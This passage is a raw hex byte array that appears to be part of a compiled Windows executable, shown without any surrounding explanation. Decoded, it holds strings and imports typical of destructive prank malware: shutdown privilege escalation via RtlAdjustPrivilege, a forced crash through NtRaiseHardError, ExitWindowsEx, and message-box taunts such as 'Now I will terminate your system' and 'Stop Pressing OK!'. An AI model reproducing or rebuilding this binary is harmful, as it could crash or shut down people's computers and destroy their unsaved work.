0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x29, 0x00, 0x00,
0x74, 0x29, 0x00, 0x00, 0x60, 0x29, 0x00, 0x00, 0x9E, 0x29, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB2, 0x28, 0x00, 0x00, 0xBA, 0x28, 0x00, 0x00,
0xCC, 0x28, 0x00, 0x00, 0x5E, 0x2D, 0x00, 0x00, 0xA2, 0x28, 0x00, 0x00,
0x2E, 0x2D, 0x00, 0x00, 0x18, 0x2D, 0x00, 0x00, 0xFE, 0x2C, 0x00, 0x00,
0xE2, 0x2C, 0x00, 0x00, 0xCE, 0x2C, 0x00, 0x00, 0x92, 0x28, 0x00, 0x00,
0x8A, 0x28, 0x00, 0x00, 0x74, 0x28, 0x00, 0x00, 0x48, 0x2D, 0x00, 0x00,
0x60, 0x28, 0x00, 0x00, 0xB0, 0x2C, 0x00, 0x00, 0x94, 0x2C, 0x00, 0x00,
0x72, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEE, 0x28, 0x00, 0x00,
0x34, 0x29, 0x00, 0x00, 0x46, 0x29, 0x00, 0x00, 0x02, 0x29, 0x00, 0x00,
0x12, 0x29, 0x00, 0x00, 0x20, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x02, 0x2A, 0x00, 0x00, 0xF8, 0x29, 0x00, 0x00, 0xDA, 0x29, 0x00, 0x00,
0xC4, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x58, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x50, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x2A, 0x00, 0x00,
0xC2, 0x2A, 0x00, 0x00, 0x8E, 0x2B, 0x00, 0x00, 0xAA, 0x2B, 0x00, 0x00,
0x20, 0x2B, 0x00, 0x00, 0xFA, 0x2A, 0x00, 0x00, 0xD4, 0x2B, 0x00, 0x00,
0xE4, 0x2B, 0x00, 0x00, 0xA0, 0x2A, 0x00, 0x00, 0x2A, 0x2B, 0x00, 0x00,
0x7E, 0x2A, 0x00, 0x00, 0x16, 0x2B, 0x00, 0x00, 0x64, 0x2A, 0x00, 0x00,
0x08, 0x2B, 0x00, 0x00, 0x40, 0x2A, 0x00, 0x00, 0x2E, 0x2A, 0x00, 0x00,
0xC6, 0x2B, 0x00, 0x00, 0xE4, 0x2A, 0x00, 0x00, 0xDC, 0x2A, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xEC, 0x2A, 0x00, 0x00, 0x7E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x5A, 0x19, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
0x74, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xC1, 0x12, 0x40, 0x00, 0x6C, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x30, 0x40, 0x00,
0x68, 0x30, 0x40, 0x00, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00,
0x52, 0x74, 0x6C, 0x41, 0x64, 0x6A, 0x75, 0x73, 0x74, 0x50, 0x72, 0x69,
0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x00, 0x00, 0x4E, 0x74, 0x52, 0x61,
0x69, 0x73, 0x65, 0x48, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72,
0x00, 0x00, 0x00, 0x00, 0x53, 0x00, 0x65, 0x00, 0x53, 0x00, 0x68, 0x00,
0x75, 0x00, 0x74, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x6E, 0x00,
0x50, 0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x69, 0x00, 0x6C, 0x00,
0x65, 0x00, 0x67, 0x00, 0x65, 0x00, 0x00, 0x00, 0x41, 0x00, 0x41, 0x00,
0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x00, 0x6F, 0x00,
0x77, 0x00, 0x20, 0x00, 0x49, 0x00, 0x20, 0x00, 0x77, 0x00, 0x69, 0x00,
0x6C, 0x00, 0x6C, 0x00, 0x20, 0x00, 0x74, 0x00, 0x65, 0x00, 0x72, 0x00,
0x6D, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x74, 0x00, 0x65, 0x00,
0x20, 0x00, 0x79, 0x00, 0x6F, 0x00, 0x75, 0x00, 0x72, 0x00, 0x20, 0x00,
0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6D, 0x00,
0x00, 0x00, 0x00, 0x00, 0x53, 0x00, 0x74, 0x00, 0x6F, 0x00, 0x70, 0x00,
0x20, 0x00, 0x50, 0x00, 0x72, 0x00, 0x65, 0x00, 0x73, 0x00, 0x73, 0x00,
0x69, 0x00, 0x6E, 0x00, 0x67, 0x00, 0x20, 0x00, 0x4F, 0x00, 0x4B, 0x00,
0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x09, 0xFB, 0x60,
0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00,
0x84, 0x23, 0x00, 0x00, 0x84, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x7C, 0x09, 0xFB, 0x60, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00,
0x14, 0x00, 0x00, 0x00, 0xDC, 0x23, 0x00, 0x00, 0xDC, 0x17, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x7C, 0x09, 0xFB, 0x60, 0x00, 0x00, 0x00, 0x00,
0x0D, 0x00, 0x00, 0x00, 0x54, 0x02, 0x00, 0x00, 0xF0, 0x23, 0x00, 0x00,
0xF0, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x09, 0xFB, 0x60,
0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBC, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x30, 0x40, 0x00,
0x80, 0x23, 0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x21, 0x40, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x74, 0x33, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x15, 0x1C, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53,
0x71, 0xE6, 0x2F, 0x4D, 0xDB, 0x37, 0x8A, 0x47, 0x9B, 0x62, 0x14, 0x62,
0x2D, 0xF8, 0xA9, 0x82, 0x02, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x55,
0x73, 0x65, 0x72, 0x73, 0x5C, 0x4F, 0x45, 0x4D, 0x5C, 0x44, 0x65, 0x73,
0x6B, 0x74, 0x6F, 0x70, 0x5C, 0x44, 0x65, 0x76, 0x5C, 0x63, 0x70, 0x70,
0x5C, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x5C,
0x52, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5C, 0x4D, 0x65, 0x73, 0x73,
0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x2E, 0x70, 0x64, 0x62, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
0x01, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C,
0x00, 0x10, 0x00, 0x00, 0x41, 0x0F, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78,
0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
0x04, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35,
0x00, 0x00, 0x00, 0x00, 0x04, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x30, 0x30, 0x63, 0x66, 0x67, 0x00, 0x00, 0x08, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41,
0x00, 0x00, 0x00, 0x00, 0x0C, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41, 0x41, 0x00, 0x00, 0x00,
0x10, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
0x24, 0x58, 0x43, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x14, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41,
0x00, 0x00, 0x00, 0x00, 0x18, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00,
0x1C, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
0x24, 0x58, 0x49, 0x41, 0x43, 0x00, 0x00, 0x00, 0x20, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x5A,
0x00, 0x00, 0x00, 0x00, 0x24, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x41, 0x00, 0x00, 0x00, 0x00,
0x28, 0x21, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54,
0x24, 0x58, 0x50, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x21, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x41,
0x00, 0x00, 0x00, 0x00, 0x30, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x5A, 0x00, 0x00, 0x00, 0x00,
0x38, 0x21, 0x00, 0x00, 0x48, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
0x74, 0x61, 0x00, 0x00, 0x80, 0x23, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x73, 0x78, 0x64, 0x61, 0x74,
0x61, 0x00, 0x00, 0x00, 0x84, 0x23, 0x00, 0x00, 0xC0, 0x02, 0x00, 0x00,
0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62,
0x67, 0x00, 0x00, 0x00, 0x44, 0x26, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x2E, 0x72, 0x74, 0x63, 0x24, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00,
0x48, 0x26, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63,
0x24, 0x49, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x26, 0x00, 0x00,
0x04, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x41, 0x41,
0x00, 0x00, 0x00, 0x00, 0x50, 0x26, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00,
0x58, 0x26, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x2E, 0x78, 0x64, 0x61,
0x74, 0x61, 0x24, 0x78, 0x00, 0x00, 0x00, 0x00, 0x94, 0x26, 0x00, 0x00,
0xB4, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32,
0x00, 0x00, 0x00, 0x00, 0x48, 0x27, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00,
0x5C, 0x27, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x60, 0x28, 0x00, 0x00,
0x26, 0x05, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36,
0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x18, 0x30, 0x00, 0x00,
0x7C, 0x03, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00,
0x00, 0x40, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72,
0x63, 0x24, 0x30, 0x31, 0x00, 0x00, 0x00, 0x00, 0x60, 0x40, 0x00, 0x00,
0x80, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xFE, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xCC, 0xFF, 0xFF, 0xFF,
0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xFF, 0xFF, 0xAD, 0x14, 0x40, 0x00,
0xC1, 0x14, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0xFF, 0xFF,
0x00, 0x00, 0x00, 0x00, 0xD8, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
0xFE, 0xFF, 0xFF, 0xFF, 0xCF, 0x17, 0x40, 0x00, 0xE2, 0x17, 0x40, 0x00,
0x70, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xE0, 0x28, 0x00, 0x00, 0x14, 0x20, 0x00, 0x00, 0xBC, 0x27, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x29, 0x00, 0x00,
0x60, 0x20, 0x00, 0x00, 0x5C, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB6, 0x29, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
0xD8, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x1C, 0x2A, 0x00, 0x00, 0x7C, 0x20, 0x00, 0x00, 0x04, 0x28, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x2B, 0x00, 0x00,
0xA8, 0x20, 0x00, 0x00, 0xFC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x12, 0x2C, 0x00, 0x00, 0xA0, 0x20, 0x00, 0x00,
0x54, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x32, 0x2C, 0x00, 0x00, 0xF8, 0x20, 0x00, 0x00, 0xF4, 0x27, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x2C, 0x00, 0x00,
0x98, 0x20, 0x00, 0x00, 0xEC, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x74, 0x2C, 0x00, 0x00, 0x90, 0x20, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x29, 0x00, 0x00,
0x74, 0x29, 0x00, 0x00, 0x60, 0x29, 0x00, 0x00, 0x9E, 0x29, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xB2, 0x28, 0x00, 0x00, 0xBA, 0x28, 0x00, 0x00,
0xCC, 0x28, 0x00, 0x00, 0x5E, 0x2D, 0x00, 0x00, 0xA2, 0x28, 0x00, 0x00,
0x2E, 0x2D, 0x00, 0x00, 0x18, 0x2D, 0x00, 0x00, 0xFE, 0x2C, 0x00, 0x00,
0xE2, 0x2C, 0x00, 0x00, 0xCE, 0x2C, 0x00, 0x00, 0x92, 0x28, 0x00, 0x00,
0x8A, 0x28, 0x00, 0x00, 0x74, 0x28, 0x00, 0x00, 0x48, 0x2D, 0x00, 0x00,
0x60, 0x28, 0x00, 0x00, 0xB0, 0x2C, 0x00, 0x00, 0x94, 0x2C, 0x00, 0x00,
0x72, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEE, 0x28, 0x00, 0x00,
0x34, 0x29, 0x00, 0x00, 0x46, 0x29, 0x00, 0x00, 0x02, 0x29, 0x00, 0x00,
0x12, 0x29, 0x00, 0x00, 0x20, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x02, 0x2A, 0x00, 0x00, 0xF8, 0x29, 0x00, 0x00, 0xDA, 0x29, 0x00, 0x00,
0xC4, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x58, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x50, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCE, 0x2A, 0x00, 0x00,
0xC2, 0x2A, 0x00, 0x00, 0x8E, 0x2B, 0x00, 0x00, 0xAA, 0x2B, 0x00, 0x00,
0x20, 0x2B, 0x00, 0x00, 0xFA, 0x2A, 0x00, 0x00, 0xD4, 0x2B, 0x00, 0x00,
0xE4, 0x2B, 0x00, 0x00, 0xA0, 0x2A, 0x00, 0x00, 0x2A, 0x2B, 0x00, 0x00,
0x7E, 0x2A, 0x00, 0x00, 0x16, 0x2B, 0x00, 0x00, 0x64, 0x2A, 0x00, 0x00,
0x08, 0x2B, 0x00, 0x00, 0x40, 0x2A, 0x00, 0x00, 0x2E, 0x2A, 0x00, 0x00,
0xC6, 0x2B, 0x00, 0x00, 0xE4, 0x2A, 0x00, 0x00, 0xDC, 0x2A, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0xEC, 0x2A, 0x00, 0x00, 0x7E, 0x2B, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x1A, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72,
0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00,
0x1F, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74,
0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x49, 0x64, 0x00, 0x00, 0x81, 0x05,
0x53, 0x6C, 0x65, 0x65, 0x70, 0x00, 0xC5, 0x03, 0x4C, 0x6F, 0x61, 0x64,
0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x00, 0xF6, 0x00,
0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64,
0x00, 0x00, 0x67, 0x00, 0x42, 0x65, 0x65, 0x70, 0x00, 0x00, 0xB1, 0x02,
0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65,
0x73, 0x73, 0x00, 0x00, 0x0A, 0x02, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E,
0x73, 0x6F, 0x6C, 0x65, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x00, 0x00,
0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C,
0x00, 0x00, 0x7D, 0x03, 0x53, 0x65, 0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F,
0x77, 0x73, 0x48, 0x6F, 0x6F, 0x6B, 0x45, 0x78, 0x57, 0x00, 0x0F, 0x01,
0x45, 0x78, 0x69, 0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x45,
0x78, 0x00, 0x85, 0x03, 0x53, 0x68, 0x6F, 0x77, 0x57, 0x69, 0x6E, 0x64,
0x6F, 0x77, 0x00, 0x00, 0xC5, 0x01, 0x47, 0x65, 0x74, 0x53, 0x79, 0x73,
0x74, 0x65, 0x6D, 0x4D, 0x65, 0x74, 0x72, 0x69, 0x63, 0x73, 0x00, 0x00,
0x1F, 0x00, 0x43, 0x61, 0x6C, 0x6C, 0x4E, 0x65, 0x78, 0x74, 0x48, 0x6F,
0x6F, 0x6B, 0x45, 0x78, 0x00, 0x00, 0x88, 0x02, 0x4D, 0x65, 0x73, 0x73,
0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x57, 0x00, 0x55, 0x53, 0x45, 0x52,
0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x15, 0x02, 0x4F, 0x70,
0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x6B,
0x65, 0x6E, 0x00, 0x00, 0xD2, 0x00, 0x43, 0x72, 0x79, 0x70, 0x74, 0x47,
0x65, 0x6E, 0x52, 0x61, 0x6E, 0x64, 0x6F, 0x6D, 0x00, 0x00, 0x1F, 0x00,
0x41, 0x64, 0x6A, 0x75, 0x73, 0x74, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x50,
0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x00, 0xAF, 0x01,
0x4C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C,
0x65, 0x67, 0x65, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x57, 0x00, 0x41, 0x44,
0x56, 0x41, 0x50, 0x49, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
0x1C, 0x00, 0x5F, 0x5F, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x5F,
0x65, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x1D, 0x00,
0x5F, 0x5F, 0x63, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x5F, 0x65, 0x78,
0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x5F, 0x63, 0x6F, 0x6E, 0x74,
0x65, 0x78, 0x74, 0x00, 0x48, 0x00, 0x6D, 0x65, 0x6D, 0x73, 0x65, 0x74,
0x00, 0x00, 0x35, 0x00, 0x5F, 0x65, 0x78, 0x63, 0x65, 0x70, 0x74, 0x5F,
0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x34, 0x5F, 0x63, 0x6F, 0x6D,
0x6D, 0x6F, 0x6E, 0x00, 0x56, 0x43, 0x52, 0x55, 0x4E, 0x54, 0x49, 0x4D,
0x45, 0x31, 0x34, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x42, 0x00,
0x5F, 0x73, 0x65, 0x68, 0x5F, 0x66, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x5F,
0x65, 0x78, 0x65, 0x00, 0x44, 0x00, 0x5F, 0x73, 0x65, 0x74, 0x5F, 0x61,
0x70, 0x70, 0x5F, 0x74, 0x79, 0x70, 0x65, 0x00, 0x2E, 0x00, 0x5F, 0x5F,
0x73, 0x65, 0x74, 0x75, 0x73, 0x65, 0x72, 0x6D, 0x61, 0x74, 0x68, 0x65,
0x72, 0x72, 0x00, 0x00, 0x19, 0x00, 0x5F, 0x63, 0x6F, 0x6E, 0x66, 0x69,
0x67, 0x75, 0x72, 0x65, 0x5F, 0x6E, 0x61, 0x72, 0x72, 0x6F, 0x77, 0x5F,
0x61, 0x72, 0x67, 0x76, 0x00, 0x00, 0x35, 0x00, 0x5F, 0x69, 0x6E, 0x69,
0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x6E, 0x61, 0x72, 0x72,
0x6F, 0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65,
0x6E, 0x74, 0x00, 0x00, 0x2A, 0x00, 0x5F, 0x67, 0x65, 0x74, 0x5F, 0x69,
0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x5F, 0x6E, 0x61, 0x72, 0x72, 0x6F,
0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E,
0x74, 0x00, 0x38, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72,
